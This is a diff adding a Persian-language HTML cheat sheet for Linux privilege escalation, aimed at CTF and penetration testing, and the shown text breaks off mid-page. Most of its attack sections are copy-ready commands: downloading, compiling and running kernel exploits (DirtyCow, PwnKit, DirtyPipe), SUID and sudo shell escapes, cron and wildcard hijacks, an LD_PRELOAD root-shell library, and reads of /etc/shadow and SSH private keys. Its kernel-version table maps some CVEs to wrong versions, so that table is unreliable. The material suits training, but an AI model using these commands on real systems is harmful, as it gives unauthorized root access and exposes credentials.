@@ -1,0 +1,1309 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Privilege Escalation Ultimate Guide - Final Edition</title>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --border-color: #30363d;
+            --text-color: #c9d1d9;
+            --muted-color: #8b949e;
+            --primary-color: #e3b341; /* Amber/Gold for Root/Privilege Escalation */
+            --accent-color: #f2cc60;  /* Light Gold accent */
+            --warn-color: #d29922;
+            --danger-color: #f85149;
+            --code-bg: #010409;
+            --hover-bg: #1f2937;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-left: 1px solid var(--border-color);
+            padding: 20px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar-header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        .sidebar-header h1 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .sidebar-header p {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            text-align: center;
+        }
+
+        .search-box {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 15px;
+            background-color: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-color);
+            font-family: 'Vazirmatn', sans-serif;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(227, 179, 65, 0.2);
+        }
+
+        .nav-list {
+            list-style: none;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .nav-list li {
+            margin-bottom: 5px;
+        }
+
+        .nav-list li a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            font-size: 0.9rem;
+            border-right: 3px solid transparent;
+        }
+
+        .nav-list li a:hover {
+            background-color: var(--hover-bg);
+            color: var(--primary-color);
+        }
+
+        .nav-list li a.active {
+            background-color: rgba(227, 179, 65, 0.1);
+            color: var(--primary-color);
+            border-right: 3px solid var(--primary-color);
+            font-weight: bold;
+        }
+
+        .nav-badge {
+            font-size: 0.7rem;
+            background: var(--bg-color);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--muted-color);
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-right: 300px;
+            padding: 40px;
+            flex: 1;
+            max-width: 1100px;
+        }
+
+        .main-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .main-header h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(227, 179, 65, 0.3);
+        }
+
+        .main-header p {
+            color: var(--muted-color);
+            font-size: 1.1rem;
+        }
+
+        /* Tool Sections */
+        .tool-section {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+            scroll-margin-top: 20px;
+        }
+
+        .tool-title {
+            color: var(--accent-color);
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        /* Badges & Tags */
+        .goal-box {
+            background: rgba(227, 179, 65, 0.1);
+            border: 1px solid rgba(227, 179, 65, 0.2);
+            border-right: 4px solid var(--primary-color);
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            color: var(--primary-color);
+        }
+
+        .sub-title {
+            color: var(--text-color);
+            margin: 25px 0 15px 0;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .tag-base { background: rgba(227, 179, 65, 0.2); color: var(--primary-color); }
+        .tag-ctf { background: rgba(242, 204, 96, 0.2); color: var(--accent-color); }
+        .tag-tip { background: rgba(210, 153, 34, 0.2); color: var(--warn-color); }
+
+        /* Code Blocks (Terminal Style) */
+        .code-container {
+            position: relative;
+            margin: 15px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            background: var(--code-bg);
+        }
+
+        .code-header {
+            background: #161b22;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+
+        .code-lang {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            font-family: monospace;
+        }
+
+        .copy-btn {
+            background: transparent;
+            color: var(--muted-color);
+            border: 1px solid var(--border-color);
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-color);
+            color: #000;
+            border-color: var(--primary-color);
+        }
+
+        pre {
+            background-color: var(--code-bg) !important;
+            padding: 15px !important;
+            border-radius: 0;
+            overflow-x: auto;
+            margin: 0;
+            direction: ltr;
+            text-align: left;
+            max-height: 600px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        /* Table Styles */
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--card-bg);
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--bg-color);
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background-color: var(--hover-bg);
+        }
+
+        /* Checklist & Special Blocks */
+        .checklist-box {
+            background: rgba(242, 204, 96, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .checklist-box ul {
+            list-style: none;
+        }
+        .checklist-box li {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .checklist-box li::before {
+            content: "☐";
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-left: 10px;
+        }
+
+        .tip-box {
+            background: rgba(210, 153, 34, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .tip-box ol {
+            padding-right: 20px;
+        }
+        .tip-box li {
+            margin-bottom: 10px;
+        }
+        
+        /* Warning Box */
+        .warn-box {
+            background: rgba(248, 81, 73, 0.1);
+            border: 1px solid rgba(248, 81, 73, 0.2);
+            border-right: 4px solid var(--danger-color);
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            color: var(--danger-color);
+            font-weight: bold;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            body { flex-direction: column; }
+            .sidebar {
+                position: relative;
+                width: 100%;
+                height: auto;
+                border-left: none;
+                border-bottom: 1px solid var(--border-color);
+            }
+            .main-content {
+                margin-right: 0;
+                padding: 20px;
+                width: 100%;
+            }
+            .nav-list { max-height: 200px; }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary-color); }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h1>🐧 LINUX PRIVESC</h1>
+            <p>Ultimate CTF Guide - Final</p>
+        </div>
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="🔎 جستجوی فاز..." oninput="filterTools()">
+        </div>
+        <ul class="nav-list" id="navList">
+            <li><a href="#intro">🎯 هدف نهایی <span class="nav-badge">Goal</span></a></li>
+            <li><a href="#phase0">فاز ۰: Initial Enum <span class="nav-badge">System</span></a></li>
+            <li><a href="#phase1">فاز ۱: Network & Service <span class="nav-badge">Procs</span></a></li>
+            <li><a href="#phase2">فاز ۲: Config Analysis <span class="nav-badge">Files</span></a></li>
+            <li><a href="#phase3">فاز ۳: Log Analysis <span class="nav-badge">Logs</span></a></li>
+            <li><a href="#phase4">فاز ۴: Privilege Esc <span class="nav-badge">Root</span></a></li>
+            <li><a href="#phase5">فاز ۵: Port Forwarding <span class="nav-badge">Tunnel</span></a></li>
+            <li><a href="#phase6">فاز ۶: Auto Tools <span class="nav-badge">Speed</span></a></li>
+            <li><a href="#checklist">چک‌لیست نهایی <span class="nav-badge">100%</span></a></li>
+            <li><a href="#tips">نکات طلایی <span class="nav-badge">Pro</span></a></li>
+            <li><a href="#machines">ماشین‌های پیشنهادی <span class="nav-badge">Practice</span></a></li>
+        </ul>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <header class="main-header">
+            <h1>چیت‌شیت فوق‌جامع ارتقای دسترسی لینوکس</h1>
+            <p>نسخه نهایی و ایمن برای مسابقات حرفه‌ای CTF - نمایش کدها بدون اجرا</p>
+        </header>
+
+        <!-- Intro -->
+        <section id="intro" class="tool-section">
+            <h2 class="tool-title">🎯 هدف نهایی</h2>
+            <div class="goal-box">
+                تسلط کامل بر <strong>شناسایی دستی</strong> سیستم‌های لینوکسی و <strong>ارتقای سطح دسترسی</strong> با استفاده از تمام تکنیک‌های ممکن، مناسب برای مسابقات CTF حرفه‌ای و تست‌نفوذ واقعی.
+            </div>
+        </section>
+
+        <!-- Phase 0 -->
+        <section id="phase0" class="tool-section">
+            <h2 class="tool-title">📋 فاز ۰: شناسایی اولیه سیستم (Initial Enumeration)</h2>
+            
+            <h3 class="sub-title">۱. اطلاعات پایه سیستم</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># اطلاعات کرنل و سیستم‌عامل
+uname -a
+uname -r
+uname -m
+cat /etc/issue
+cat /etc/os-release
+lsb_release -a
+hostnamectl
+
+# اطلاعات سخت‌افزاری
+cat /proc/cpuinfo
+cat /proc/meminfo
+df -h
+df -a
+mount
+lsblk
+fdisk -l
+free -h
+uptime</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. اطلاعات کاربر فعلی</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">whoami
+id
+groups
+id root
+sudo -l
+cat /etc/passwd | grep -v "nologin\|false"  # کاربران فعال
+cat /etc/passwd | cut -d: -f1  # تمام کاربران
+cat /etc/shadow  # فقط با دسترسی روت
+lastlog
+last
+w
+who</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. تاریخچه دستورات (همه فایل‌ها)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">history
+cat ~/.bash_history
+cat ~/.zsh_history
+cat ~/.mysql_history
+cat ~/.psql_history
+cat ~/.nano_history
+cat ~/.viminfo
+cat ~/.python_history
+cat ~/.node_history
+cat /root/.bash_history  # اگر دسترسی داشته باشید</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. متغیرهای محیطی</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">env
+set
+export
+cat /etc/environment
+cat /etc/profile
+cat ~/.bashrc
+cat ~/.profile
+cat ~/.bash_profile</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 1 -->
+        <section id="phase1" class="tool-section">
+            <h2 class="tool-title">🖥️ فاز ۱: شناسایی سرویس‌ها و شبکه</h2>
+            
+            <h3 class="sub-title">۱. فرآیندهای در حال اجرا</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">ps aux
+ps -ef
+ps auxf  # درخت فرآیندها
+ps -eo pid,user,comm,args --sort=-%mem | head -20
+ps -eo pid,user,comm,args --sort=-%cpu | head -20
+ps -ef | grep -v "^UID" | sort -k4  # مرتب‌سازی بر اساس کاربر
+
+# فرآیندهای مخفی
+ps -e -o pid,cmd | grep -E "(nc|bash|sh|python|perl|ruby)"
+lsof -p $$  # فایل‌های باز توسط کاربر فعلی</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. پورت‌های باز و اتصالات شبکه</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># همه روش‌ها
+netstat -tulpn
+netstat -anp
+ss -tulpn
+ss -anp
+lsof -i
+lsof -i -P -n | grep LISTEN
+lsof -i :22  # پورت خاص
+
+# اتصالات خارجی
+netstat -antp | grep ESTABLISHED
+ss -antp | grep ESTABLISHED
+
+# درخواست‌های DNS
+cat /etc/resolv.conf
+dig target.com
+nslookup target.com</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. سرویس‌های در حال اجرا (Systemd)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># Systemd
+systemctl list-units --type=service --state=running
+systemctl list-units --type=service --state=enabled
+systemctl list-timers
+systemctl list-sockets
+
+# SysV Init
+service --status-all
+chkconfig --list  # RedHat/CentOS
+rc-status  # Alpine
+
+# Upstart
+initctl list</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 2 -->
+        <section id="phase2" class="tool-section">
+            <h2 class="tool-title">📁 فاز ۲: تحلیل فایل‌های پیکربندی حساس</h2>
+            
+            <h3 class="sub-title">۱. پیکربندی SSH</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_config
+ls -la /etc/ssh/
+cat /etc/ssh/ssh_host_*  # کلیدهای میزبان
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/known_hosts
+ls -la ~/.ssh/
+find / -name "id_rsa" 2>/dev/null
+find / -name "*.pem" 2>/dev/null
+find / -name "*.key" 2>/dev/null</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. پیکربندی وب‌سرورها و پایگاه داده</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># Apache
+cat /etc/apache2/apache2.conf
+cat /etc/apache2/sites-enabled/*
+cat /etc/httpd/conf/httpd.conf  # RedHat
+
+# Nginx
+cat /etc/nginx/nginx.conf
+cat /etc/nginx/sites-enabled/*
+
+# Tomcat
+cat /opt/tomcat/conf/tomcat-users.xml
+find / -name "tomcat-users.xml" 2>/dev/null
+
+# MySQL/MariaDB
+cat /etc/mysql/my.cnf
+cat ~/.my.cnf
+
+# PostgreSQL
+cat /etc/postgresql/*/main/pg_hba.conf
+
+# Redis
+cat /etc/redis/redis.conf</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. سایر فایل‌های پیکربندی حیاتی</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">cat /etc/fstab
+cat /etc/crontab
+cat /etc/exports  # NFS
+cat /etc/sudoers  # فقط با دسترسی روت
+cat /etc/sudoers.d/*
+cat /etc/hosts.allow
+cat /etc/hosts.deny
+
+# فایل‌های حاوی رمز عبور
+find / -name "*.conf" -exec grep -l "password\|secret\|key" {} \; 2>/dev/null
+find / -name "*.ini" -exec grep -l "password\|secret\|key" {} \; 2>/dev/null
+find / -name "*.yml" -exec grep -l "password\|secret\|key" {} \; 2>/dev/null
+find / -name "*.json" -exec grep -l "password\|secret\|key" {} \; 2>/dev/null</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 3 -->
+        <section id="phase3" class="tool-section">
+            <h2 class="tool-title">📜 فاز ۳: تحلیل گزارش‌ها (Log Analysis)</h2>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># گزارش‌های ورود (Authentication Logs)
+grep "Failed password" /var/log/auth.log
+grep "Accepted password" /var/log/auth.log
+grep "Invalid user" /var/log/auth.log
+
+# SSH اتصالات
+grep "sshd" /var/log/auth.log | tail -50
+grep "Accepted publickey" /var/log/auth.log
+
+# Sudo و دستورات
+grep "sudo" /var/log/auth.log
+grep "COMMAND" /var/log/auth.log
+
+# گزارش‌های وب‌سرور
+cat /var/log/apache2/access.log
+cat /var/log/nginx/error.log
+grep -E "POST|PUT|DELETE" /var/log/apache2/access.log
+
+# درخواست‌های suspicious
+grep -E "(\.\./|\.\.\.|union|select|eval|system)" /var/log/apache2/access.log
+
+# گزارش‌های سیستم
+cat /var/log/syslog
+cat /var/log/messages
+dmesg | tail -100
+journalctl -xe
+journalctl -u sshd
+journalctl -u apache2</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 4 (The Big One) -->
+        <section id="phase4" class="tool-section">
+            <h2 class="tool-title">🔑 فاز ۴: ارتقای دسترسی (Privilege Escalation)</h2>
+            
+            <h3 class="sub-title">۱️⃣ Kernel Exploits (اکسپلویت کرنل)</h3>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>نسخه کرنل</th>
+                            <th>اکسپلویت</th>
+                            <th>CVE</th>
+                            <th>توضیحات</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>2.6.22 - 3.9</td><td>DirtyCow</td><td>CVE-2016-5195</td><td>معروف‌ترین اکسپلویت</td></tr>
+                        <tr><td>2.6.37 - 3.8.9</td><td>OverlayFS</td><td>CVE-2015-1328</td><td>Ubuntu 12.04/14.04</td></tr>
+                        <tr><td>3.13.0 - 4.4.0</td><td>Mempodipper</td><td>CVE-2015-3290</td><td>Ubuntu</td></tr>
+                        <tr><td>4.4.x - 4.8.x</td><td>DirtyPipe</td><td>CVE-2022-0847</td><td>جدیدترین</td></tr>
+                        <tr><td>5.0 - 5.11</td><td>Sudo Baron</td><td>CVE-2021-3156</td><td>Sudo exploit</td></tr>
+                        <tr><td>5.8.x</td><td>cgroups</td><td>CVE-2022-0492</td><td>Container escape</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">لیست کامل اکسپلویت‌های کرنل:</h4>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># DirtyCow (CVE-2016-5195)
+wget https://www.exploit-db.com/raw/40847 -O dirtycow.c
+gcc -pthread dirtycow.c -o dirtycow
+./dirtycow
+
+# CVE-2021-3493 (Ubuntu OverlayFS)
+wget https://www.exploit-db.com/raw/50025 -O exploit.c
+gcc exploit.c -o exploit
+./exploit
+
+# DirtyPipe (CVE-2022-0847)
+wget https://haxx.in/files/dirtypipez.c
+gcc -o dirtypipez dirtypipez.c
+./dirtypipez /etc/passwd 1
+
+# PwnKit (CVE-2021-4034)
+wget https://www.exploit-db.com/raw/50775 -O pwnkit.c
+gcc -o pwnkit pwnkit.c
+./pwnkit
+
+# اسکریپت اتوماتیک جستجوی اکسپلویت
+searchsploit linux kernel $(uname -r | cut -d- -f1)
+searchsploit -m $(searchsploit linux kernel $(uname -r | cut -d- -f1) | grep -E "\.c$" | head -1)</code></pre>
+            </div>
+            <div class="warn-box">⚠️ هشدار: اکسپلویت‌های کرنل ممکن است سیستم را کرش کنند. همیشه آخرین راه‌حل باشند.</div>
+
+            <h3 class="sub-title">۲️⃣ SUID/GUID Files</h3>
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">پیدا کردن فایل‌های SUID و SGID:</h4>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># SUID (Set User ID)
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null  # SGID
+
+# همه با هم
+find / -type f -perm -4000 -o -perm -2000 2>/dev/null
+
+# با قابلیت اجرا
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null
+
+# فایل‌های جدید
+find / -type f -perm -4000 -mtime -30 2>/dev/null</code></pre>
+            </div>
+
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">فایل‌های SUID خطرناک - کامل:</h4>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># Bash/Shell
+/bin/bash -p
+/bin/sh -p
+
+# Python
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Perl
+perl -e 'setuid(0); exec("/bin/bash");'
+
+# PHP
+php -r 'posix_setuid(0); system("/bin/bash");'
+
+# find
+find . -exec /bin/bash -p \; -quit
+
+# vim
+vim -c ':!/bin/bash'
+
+# awk
+awk 'BEGIN {system("/bin/bash")}'
+
+# tar
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+# nmap (نسخه‌های قدیمی)
+nmap --interactive
+!sh
+
+# cp
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+/tmp/rootbash -p</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳️⃣ Cron Jobs</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># پیدا کردن تمام کرون‌جاب‌ها
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.daily/
+crontab -l
+crontab -l -u root  # اگر دسترسی داشته باشید
+
+# روش‌های بهره‌برداری:
+
+# ۱. فایل قابل نوشتن:
+echo '#!/bin/bash' &gt;&gt; /path/to/script.sh
+echo 'chmod +s /bin/bash' &gt;&gt; /path/to/script.sh
+/bin/bash -p
+
+# ۲. PATH Injection:
+echo '#!/bin/bash' &gt; /tmp/backup.sh
+echo 'cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash' &gt;&gt; /tmp/backup.sh
+chmod +x /tmp/backup.sh
+export PATH=/tmp:$PATH
+/tmp/bash -p
+
+# ۳. Wildcard Injection:
+echo 'cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash' &gt; /tmp/script.sh
+chmod +x /tmp/script.sh
+touch "/tmp/--exec=./script.sh"
+
+# ۴. استفاده از pspy:
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+./pspy64 -cf -p  # مشاهده تمام فرآیندها</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴️⃣ Sudo Misconfigurations</h3>
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">بررسی دستورات قابل اجرا:</h4>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">sudo -l
+sudo -ll  # اطلاعات بیشتر
+echo "sudo -l" | sudo -S 2&gt;/dev/null</code></pre>
+            </div>
+
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">لیست کامل دستورات سودو و روش‌های بهره‌برداری:</h4>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>دستور</th>
+                            <th>روش بهره‌برداری</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><code>sudo find</code></td><td><code>sudo find . -exec /bin/bash \;</code></td></tr>
+                        <tr><td><code>sudo vim</code></td><td><code>sudo vim -c ':!/bin/bash'</code></td></tr>
+                        <tr><td><code>sudo python</code></td><td><code>sudo python -c 'import pty;pty.spawn("/bin/bash")'</code></td></tr>
+                        <tr><td><code>sudo perl</code></td><td><code>sudo perl -e 'exec "/bin/bash";'</code></td></tr>
+                        <tr><td><code>sudo awk</code></td><td><code>sudo awk 'BEGIN {system("/bin/bash")}'</code></td></tr>
+                        <tr><td><code>sudo tar</code></td><td><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></td></tr>
+                        <tr><td><code>sudo nmap</code></td><td><code>sudo nmap --interactive</code> سپس <code>!sh</code></td></tr>
+                        <tr><td><code>sudo less</code></td><td><code>sudo less /etc/passwd</code> سپس <code>!/bin/bash</code></td></tr>
+                        <tr><td><code>sudo docker</code></td><td><code>sudo docker run -v /:/mnt -it ubuntu bash</code></td></tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <h4 class="sub-title" style="font-size: 1.1rem; color: var(--warn-color);">تکنیک‌های پیشرفته Sudo (LD_PRELOAD):</h4>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">c</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-c">// /tmp/evil.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}</code></pre>
+            </div>
+            <div class="code-container">
+                <div class="code-header">
